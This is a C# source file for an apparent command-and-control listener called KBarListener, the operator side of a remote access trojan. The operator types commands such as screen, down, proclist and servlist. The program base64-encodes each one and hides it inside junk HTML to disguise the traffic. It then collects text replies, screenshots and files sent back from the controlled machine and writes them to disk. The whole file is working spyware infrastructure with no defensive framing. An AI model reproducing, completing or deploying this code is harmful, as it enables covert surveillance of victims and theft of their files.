using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace KBarListener
{
    class Program
    {
        static string Base64Encode(string plain)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plain);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        static string Base64Decode(string encoded)
        {
            byte[] data = Convert.FromBase64String(encoded);
            string decodedData = Encoding.UTF8.GetString(data);
            return decodedData;
        }

        static void Main(string[] args)
        {
            if (!HttpListener.IsSupported)
            {
                Console.WriteLine("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
                return;
            }
          

            
            HttpListener listener = new HttpListener();
           
           
                listener.Prefixes.Add("http://127.0.0.1/index/");
                listener.Prefixes.Add("http://127.0.0.1/data/");
            string com = "";

            listener.Start();
            while (true)
            {
                
                bool binary_incoming = false;
                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;
                

                Console.WriteLine("Try: dir, cd, screen, time [good] [bad], servlist, down [path to file] or proclist");
                if (request.RawUrl == "/index/")
                {
                    
                    Console.WriteLine("Listening...");

                    com = Console.ReadLine();
                    if (com.Contains("screen") || com.Contains("down"))
                        binary_incoming = true;
                    else
                        binary_incoming = false;
                    string command = "<com>" + com + "</com>";
                    
                    string responseString = "<HTML><BODY> <p>$dollar= blach blhajsdsd $var= " + Base64Encode(command) + "zzz</p></BODY></HTML>";
                    byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
                    
                    response.ContentLength64 = buffer.Length;
                    System.IO.Stream output = response.OutputStream;
                    output.Write(buffer, 0, buffer.Length);

                    
                    output.Close();
                }
                else
                {
                    if (com.Contains("screen") || com.Contains("down"))
                        binary_incoming = true;

                    if (binary_incoming == false)
                    {
                        string data;
                        using (var reader = new StreamReader(request.InputStream, request.ContentEncoding))
                        {
                            data = reader.ReadToEnd();
                        }

                        string decoded_data = Base64Decode(data);
                        Console.WriteLine(decoded_data);
                    }
                    else
                    {
                        BinaryReader read = new BinaryReader(request.InputStream, request.ContentEncoding);
                        byte[] imBuff = read.ReadBytes((int)request.ContentLength64);
                        Console.WriteLine("Please enter the path for the screenshot");
                        string screenpath = Console.ReadLine();
                        System.IO.File.WriteAllBytes(screenpath, imBuff);
                    }

                    binary_incoming = false;
                }
                
            }
            listener.Stop();
        }
    }
}
